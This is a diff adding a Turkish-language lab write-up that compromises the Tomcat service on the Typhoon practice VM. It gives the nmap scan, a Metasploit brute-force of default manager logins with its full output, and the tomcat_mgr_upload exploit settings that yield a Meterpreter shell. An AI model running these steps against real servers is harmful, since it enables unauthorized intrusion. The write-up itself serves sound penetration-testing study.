@@ -1,0 +1,50 @@
+Tomcat 8080 portunda çalışır ilk başta tekaradan nmap komutu ile protun açık olup olmadığını kontorl ediyorum bunun için nmap -sV <ip> -p 8080 yazıyorum ;
+
+PORT     STATE SERVICE VERSION
+8080/tcp open  http    Apache Tomcat/Coyote JSP engine 1.1
+MAC Address: 00:0C:29:2F:72:69 (VMware)
+
+ve açık olduğunu doğruladım buradan sonra tomcat sürümünü bildiğimiz için (Typhoon_makinası) msfconsole yazarak giriş yazpıyoruz giriş yaptıkton sonra search tomcat
+yazıyoruz ve şu modülü seçiyoruz ; 
+
+   65  auxiliary/scanner/http/tomcat_mgr_login               .             normal     No     Tomcat Application Manager Login Utility
+
+use 65 diyerek seçip RHOSTS ve STOP_ON_SUCCSES ayarlayıp run diyoruz ve berlili bir süre sonra tomcat:tomcat bilgilerini buluyor 
+
+
+  [-] 192.168.72.131:8080 - LOGIN FAILED: root:password (Incorrect)
+[-] 192.168.72.131:8080 - LOGIN FAILED: root:Password1 (Incorrect)
+[-] 192.168.72.131:8080 - LOGIN FAILED: root:changethis (Incorrect)
+[-] 192.168.72.131:8080 - LOGIN FAILED: root:r00t (Incorrect)
+[-] 192.168.72.131:8080 - LOGIN FAILED: root:toor (Incorrect)
+[-] 192.168.72.131:8080 - LOGIN FAILED: root:password1 (Incorrect)
+[-] 192.168.72.131:8080 - LOGIN FAILED: root:j2deployer (Incorrect)
+[-] 192.168.72.131:8080 - LOGIN FAILED: root:OvW*busr1 (Incorrect)
+[-] 192.168.72.131:8080 - LOGIN FAILED: root:kdsxc (Incorrect)
+[-] 192.168.72.131:8080 - LOGIN FAILED: root:owaspba (Incorrect)
+[-] 192.168.72.131:8080 - LOGIN FAILED: root:ADMIN (Incorrect)
+[-] 192.168.72.131:8080 - LOGIN FAILED: root:xampp (Incorrect)
+[-] 192.168.72.131:8080 - LOGIN FAILED: tomcat:admin (Incorrect)
+[-] 192.168.72.131:8080 - LOGIN FAILED: tomcat:manager (Incorrect)
+[-] 192.168.72.131:8080 - LOGIN FAILED: tomcat:role1 (Incorrect)
+[-] 192.168.72.131:8080 - LOGIN FAILED: tomcat:root (Incorrect)
+[+] 192.168.72.131:8080 - Login Successful: tomcat:tomcat
+[*] Scanned 1 of 1 hosts (100% complete)
+
+
+
+şimdi msfconsole kullanrak burayı exploit etmye çalışcağız yine msfconsoel yazarak giriş yapıp search tomcat yazıyoruz ve şu modülü seçiyoruz ; 
+
+   18  exploit/multi/http/tomcat_mgr_upload                                       2009-11-09       excellent  Yes    Apache Tomcat Manager Authenticated Upload Code Execution
+
+use 18 diyerek seçiyoruz ardından HttpPassword, HttpUsername, RHOSTS, RPORT ayarlayıp ;
+
+RHOSTS --> <ip> 
+HttpUsername --> tomcat
+HttpPassword --> tomcat 
+RPORT --> 8080 
+
+ayarladıktan sonra run diyerek başlatıyorum ve meterpreter konsolu açılınca shell yazııyorum ve shelli almış oluyoruz 
+
+
+bu normalde otomatize şekilde yapılmış hali şimdi diğer kısımda manuel oalrak sömürü aşaması yapacağız 
